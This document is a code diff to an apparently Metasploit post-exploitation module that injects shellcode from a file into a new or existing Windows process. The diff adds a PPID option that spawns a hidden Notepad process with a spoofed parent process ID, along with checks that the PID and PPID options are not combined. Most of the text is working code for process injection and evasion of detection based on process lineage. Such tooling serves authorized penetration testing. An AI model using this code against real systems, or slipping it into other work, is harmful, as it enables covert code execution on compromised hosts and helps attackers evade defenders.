@@ -24,7 +24,8 @@ class MetasploitModule < Msf::Post
     register_options(
       [
         OptPath.new('SHELLCODE', [true, 'Path to the shellcode to execute']),
-        OptInt.new('PID', [false, 'Process Identifier to inject of process to inject the shellcode. (0 = new process)', 0]),
+        OptInt.new('PID', [false, 'Process Identifier of process to inject the shellcode. (0 = new process)', 0]),
+        OptInt.new('PPID', [false, 'Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)', 0]),
         OptBool.new('CHANNELIZED', [true, 'Retrieve output of the process', false]),
         OptBool.new('INTERACTIVE', [true, 'Interact with the process', false]),
         OptBool.new('HIDDEN', [true, 'Spawn an hidden process', true]),
@@ -42,6 +43,7 @@ class MetasploitModule < Msf::Post
     # Set variables
     shellcode = IO.read(datastore['SHELLCODE'])
     pid = datastore['PID']
+    ppid = datastore['PPID']
     bits = datastore['BITS']
     p = nil
     if bits == '64'
@@ -55,20 +57,34 @@ class MetasploitModule < Msf::Post
       fail_with(Failure::BadConfig, "Cannot inject a 64-bit payload into any process on a 32-bit OS")
     end
 
+    if datastore['PPID'] != 0 and datastore['PID'] != 0
+      print_error("PID and PPID are mutually exclusive")
+      return false
+    end
+
     # Start Notepad if Required
     if pid == 0
-      print_warning("It's not possible to retrieve output when injecting existing processes.")
+      if ppid != 0 and not has_pid?(ppid)
+        print_error("Process #{ppid} was not found")
+        return false
+      elsif ppid != 0
+        print_status("Spoofing PPID #{ppid}")
+      end
+
       notepad_pathname = get_notepad_pathname(bits, client.sys.config.getenv('windir'), client.arch)
       vprint_status("Starting  #{notepad_pathname}")
       proc = client.sys.process.execute(notepad_pathname, nil, {
         'Hidden' => datastore['HIDDEN'],
         'Channelized' => datastore['CHANNELIZED'],
-        'Interactive' => datastore['INTERACTIVE']
+        'Interactive' => datastore['INTERACTIVE'],
+        'ParentPid' => datastore['PPID']
       })
       print_status("Spawned Notepad process #{proc.pid}")
     else
       if datastore['CHANNELIZED'] && datastore['PID'] != 0
         fail_with(Failure::BadConfig, "It's not possible to retrieve output when injecting existing processes!")
+      elsif datastore['CHANNELIZED'] && datastore['PPID'] != 0
+        fail_with(Failure::BadConfig, "It's not possible to retrieve output when using PPID spoofing!")
       end
       unless has_pid?(pid)
         print_error("Process #{pid} was not found")
